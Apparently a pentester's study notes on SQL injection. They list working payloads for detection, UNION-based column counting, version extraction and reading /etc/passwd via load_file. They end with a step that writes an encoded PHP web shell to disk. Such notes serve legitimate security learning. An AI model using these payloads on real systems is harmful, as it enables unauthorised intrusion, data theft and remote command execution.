# Injection

All things injection

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)

## SQLI

### Methodology

- Check if user table is vulnerable by attempting to output all users

```
' OR 1=1;#
```

- Check if vulnerable with sleep function

Note: A `+` is added at the end of the comment in place of a space as a space is URL encoded into a `+` eventually before sending anyways.

```mysql
' + sleep(2);#
```

- Also can check with version command

```mysql
'; SELECT @@version;#
```

NOTE: The semicolon is added when creating a brand new statement
### UNION attacks

Allows an attacker to learn the number of columns in a database.

Start by identifying number of columns in the database

First Request

```mysql
' UNION SELECT 1,2,3;#
```

If vulnerable, response will be normal if given proper number of columns. Otherwise, it will be a 500 internal server error.

Therefore, starting with `' UNION SELECT 1-- -` and getting a 500 internal server error off the bat is a great sign. At that point, you just keep adding numbers to until you get expected response. The number of numbers will correspond to number of columns in the database.

### Key Takeaways

- SQL injection can be identified through almost any response code, so long as it deviates from intended behavior such as 302 becoming 500
- UNION attacks can be successful against an individual product page when performed using primary keys/ID's that don't exist as querying an undefined row will simply union the provided columns and return the values provided in the request (as they were originally undefined).

In the following UNION attack, the product of ID 999 does not exist, leading to the union attack exposing the vesion within the output (as the corresponding unioned row)

```mysql
999' UNION SELECT 1,@@version,3,4,5,6,7,8;#
```

NOTE: `ORDER BY` and `GROUP BY` can also be used to determine number of columns based on errors: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

Other sensitive parameters like `@@version` include:

```mysql
load_file('../../../../../../etc/passwd')
```

### SQLI2RCE

Figure out what directory you have write permissions to (MySQL is /var/lib/mysql)

```mysql
'; select from_base64("PD9waHAKc3lzdGVtKCRfR0VUWydjbWQnXSk7Cj8+Cg==") into dumpfile '/var/lib/mysql/shell.php'--+
```

Requires a method of indexing the file
### Links

- [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
	- [Cheat Sheet](Cheat%20Sheet.md)
